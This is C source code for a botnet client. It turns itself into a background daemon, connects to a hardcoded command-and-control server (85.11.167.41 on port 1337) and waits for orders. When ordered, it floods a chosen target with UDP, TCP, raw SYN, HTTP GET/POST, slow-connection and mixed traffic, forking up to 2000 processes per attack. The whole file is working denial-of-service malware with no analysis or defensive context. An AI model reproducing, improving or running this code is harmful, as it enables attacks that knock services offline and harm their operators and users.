#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdarg.h>

#define C2_HOST "85.11.167.41"
#define C2_PORT 1337

#define MAX_BUFFER 1024
#define MAX_THREADS 2000

int sockfd = -1;
volatile int running = 1;
pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;

// ==================== UTILITIES ====================

void trim(char *str) {
    char *end;
    while (*str == ' ' || *str == '\t' || *str == '\n') str++;
    end = str + strlen(str) - 1;
    while (end > str && (*end == ' ' || *end == '\t' || *end == '\n')) end--;
    *(end + 1) = '\0';
}

void random_string(char *buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buf[len] = '\0';
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// ==================== ATTACK METHODS ====================

void attack_udp(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, target, &addr.sin_addr);

            char packet[1024];
            while (time(NULL) < end && running) {
                random_string(packet, 1024);
                sendto(sock, packet, 1024, 0, (struct sockaddr *)&addr, sizeof(addr));
            }
            close(sock);
            exit(0);
        }
    }
}

void attack_tcp(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            while (time(NULL) < end && running) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);
                
                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    char buffer[1024];
                    random_string(buffer, 1024);
                    send(sock, buffer, 1024, 0);
                }
                close(sock);
            }
            exit(0);
        }
    }
}

void attack_syn(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
            if (sock < 0) {
                attack_tcp(target, port, duration - time(NULL), 1);
                exit(0);
            }

            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            inet_pton(AF_INET, target, &addr.sin_addr);

            char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + 20];
            struct iphdr *ip = (struct iphdr *)packet;
            struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

            while (time(NULL) < end && running) {
                memset(packet, 0, sizeof(packet));
                
                ip->ihl = 5;
                ip->version = 4;
                ip->tos = 0;
                ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                ip->id = htons(rand() % 65535);
                ip->frag_off = 0;
                ip->ttl = 64;
                ip->protocol = IPPROTO_TCP;
                ip->saddr = inet_addr("0.0.0.0");
                ip->daddr = addr.sin_addr.s_addr;
                ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

                tcp->source = htons(rand() % 65535);
                tcp->dest = htons(port);
                tcp->seq = htonl(rand() % 4294967295U);
                tcp->ack_seq = 0;
                tcp->doff = 5;
                tcp->syn = 1;
                tcp->window = htons(65535);
                tcp->check = 0;
                tcp->urg_ptr = 0;

                sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr));
                usleep(100);
            }
            close(sock);
            exit(0);
        }
    }
}

void attack_httpget(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            while (time(NULL) < end && running) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    char path[64];
                    random_string(path, 16);
                    char request[512];
                    snprintf(request, sizeof(request),
                        "GET /%s HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                        "Accept: */*\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n", path, target);
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            exit(0);
        }
    }
}

void attack_httppost(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            char data[2048];
            while (time(NULL) < end && running) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    random_string(data, 1024);
                    char request[4096];
                    snprintf(request, sizeof(request),
                        "POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %lu\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n%s", target, strlen(data), data);
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            exit(0);
        }
    }
}

void attack_hold(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            while (time(NULL) < end && running) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    send(sock, "GET / HTTP/1.1\r\nHost: ", 22, 0);
                    sleep(5);
                }
                close(sock);
            }
            exit(0);
        }
    }
}

void attack_mix(char *target, int port, int duration, int threads) {
    int half = threads / 2;
    attack_udp(target, port, duration, half);
    attack_tcp(target, port, duration, threads - half);
}

// ==================== ATTACK DISPATCHER ====================

typedef struct {
    char method[16];
    char target[64];
    int port;
    int duration;
    int threads;
} AttackCommand;

void execute_attack(AttackCommand *cmd) {
    if (strcmp(cmd->method, "udp") == 0) {
        attack_udp(cmd->target, cmd->port, cmd->duration, cmd->threads);
    } else if (strcmp(cmd->method, "tcp") == 0) {
        attack_tcp(cmd->target, cmd->port, cmd->duration, cmd->threads);
    } else if (strcmp(cmd->method, "syn") == 0) {
        attack_syn(cmd->target, cmd->port, cmd->duration, cmd->threads);
    } else if (strcmp(cmd->method, "httpget") == 0) {
        attack_httpget(cmd->target, cmd->port, cmd->duration, cmd->threads);
    } else if (strcmp(cmd->method, "httppost") == 0) {
        attack_httppost(cmd->target, cmd->port, cmd->duration, cmd->threads);
    } else if (strcmp(cmd->method, "hold") == 0) {
        attack_hold(cmd->target, cmd->port, cmd->duration, cmd->threads);
    } else if (strcmp(cmd->method, "mix") == 0) {
        attack_mix(cmd->target, cmd->port, cmd->duration, cmd->threads);
    }
}

// ==================== C2 CONNECTION ====================

void connect_c2() {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        sleep(10);
        return;
    }

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        sockfd = -1;
        sleep(10);
        return;
    }
}

void get_architecture() {
    printf("x86_64\n");
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    setsid();
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

// ==================== MAIN ====================

int main(int argc, char *argv[]) {
    signal(SIGCHLD, SIG_IGN);
    srand(time(NULL));

    if (argc < 2 || strcmp(argv[1], "--debug") != 0) {
        daemonize();
    }

    char buffer[MAX_BUFFER];
    AttackCommand cmd;

    while (1) {
        if (sockfd < 0) {
            connect_c2();
            if (sockfd < 0) {
                sleep(10);
                continue;
            }
        }

        get_architecture();

        while (1) {
            memset(buffer, 0, MAX_BUFFER);
            int n = recv(sockfd, buffer, MAX_BUFFER - 1, 0);
            if (n <= 0) {
                close(sockfd);
                sockfd = -1;
                break;
            }

            buffer[n] = '\0';
            trim(buffer);

            if (strlen(buffer) == 0) continue;

            char *args[8];
            int arg_count = 0;
            char *token = strtok(buffer, " ");
            while (token != NULL && arg_count < 8) {
                args[arg_count++] = token;
                token = strtok(NULL, " ");
            }

            if (arg_count == 0) continue;

            if (strcmp(args[0], "PING") == 0) {
                send(sockfd, "PONG\n", 5, 0);
                continue;
            }

            if (arg_count >= 5) {
                strncpy(cmd.method, args[0], sizeof(cmd.method) - 1);
                strncpy(cmd.target, args[1], sizeof(cmd.target) - 1);
                cmd.port = atoi(args[2]);
                cmd.duration = atoi(args[3]);
                cmd.threads = atoi(args[4]);

                if (cmd.threads > MAX_THREADS) cmd.threads = MAX_THREADS;
                if (cmd.threads < 1) cmd.threads = 1;

                execute_attack(&cmd);
            }
        }
    }

    return 0;
}